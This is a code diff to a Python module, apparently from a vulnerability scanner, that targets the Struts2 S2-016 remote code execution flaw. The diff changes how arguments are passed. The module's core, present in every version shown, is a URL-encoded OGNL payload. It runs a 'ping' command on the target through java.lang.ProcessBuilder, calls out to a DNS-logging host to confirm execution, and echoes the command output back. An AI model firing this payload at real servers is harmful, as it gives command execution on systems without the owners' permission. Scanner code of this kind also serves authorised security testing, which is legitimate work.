@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 __author__ = 'Ascotbe'
-from ClassCongregation import VulnerabilityDetails,ErrorLog,WriteFile,ErrorHandling,Proxies,Dnslog
+from ClassCongregation import VulnerabilityDetails,ErrorLog,WriteFile,ErrorHandling,Dnslog
 import urllib3
 import requests
 import time
@@ -23,29 +23,16 @@ class VulnerabilityInfo(object):
         self.info['version'] = "Struts2.0.0-Struts2.3.15"  # 这边填漏洞影响的版本
         self.info['details'] = Medusa  # 结果
 
-class UrlProcessing:  # URL处理函数
-    def result(self, url):
-        if url.startswith("http"):  # 判断是否有http头，如果没有就在下面加入
-            res = urllib.parse.urlparse(url)
-        else:
-            res = urllib.parse.urlparse('http://%s' % url)
-        return res.scheme, res.hostname, res.port,res.path
 
-def medusa(Url:str,Headers:dict,proxies:str=None,**kwargs)->None:
-    proxies=Proxies().result(proxies)
-
-    scheme, url, port,path = UrlProcessing().result(Url)
-    if port is None and scheme == 'https':
-        port = 443
-    elif port is None and scheme == 'http':
-        port = 80
-    else:
-        port = port
+def medusa(**kwargs)->None:
+    url = kwargs.get("Url")  # 获取传入的url参数
+    Headers = kwargs.get("Headers")  # 获取传入的头文件
+    proxies = kwargs.get("Proxies")  # 获取传入的代理参数
     DL=Dnslog()
     con=""
     payload="""?redirect:%24%7B%23a%3D%28new%20java.lang.ProcessBuilder%28new%20java.lang.String%5B%5D%7B%27ping%27%2c%27{}%27%7D%29%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew%20java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew%20java.io.BufferedReader%28%23c%29%2C%23e%3Dnew%20char%5B500%5D%2C%23d.read%28%23e%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23e%29%2C%23d.read%28%23e%29%2C%23matt.getWriter%28%29.println%28%23e%29%2C%23d.read%28%23e%29%2C%23matt.getWriter%28%29.println%28%23e%29%2C%23d.read%28%23e%29%2C%23matt.getWriter%28%29.println%28%23e%29%2C%23d.read%28%23e%29%2C%23matt.getWriter%28%29.println%28%23e%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D""".format(DL.dns_host())
     try:
-        payload_url = scheme + "://" + url +":"+ str(port)+path+payload
+        payload_url = url+payload
 
         try:#防止在linux系统上执行了POC，导致超时扫描不到漏洞
             resp = requests.get(payload_url,headers=Headers, timeout=6,proxies=proxies, verify=False)
@@ -57,7 +44,7 @@ def medusa(Url:str,Headers:dict,proxies:str=None,**kwargs)->None:
         if DL.result():
             Medusa = "{} 存在Struts2远程代码执行漏洞(S2-016)\r\n漏洞详情:\r\n版本号:S2-016\r\n使用EXP:{}\r\n返回数据:{}\r\n返回DNSLOG数据:{}\r\n使用DNSLOG:{}\r\n".format(url,payload_url,con,DL.dns_text(),DL.dns_host())
             _t=VulnerabilityInfo(Medusa)
-            VulnerabilityDetails(_t.info, url,**kwargs).Write()  # 传入url和扫描到的数据
+            VulnerabilityDetails(_t.info, resp,**kwargs).Write()  # 传入url和扫描到的数据
             WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
     except Exception as e:
         _ = VulnerabilityInfo('').info.get('algroup')
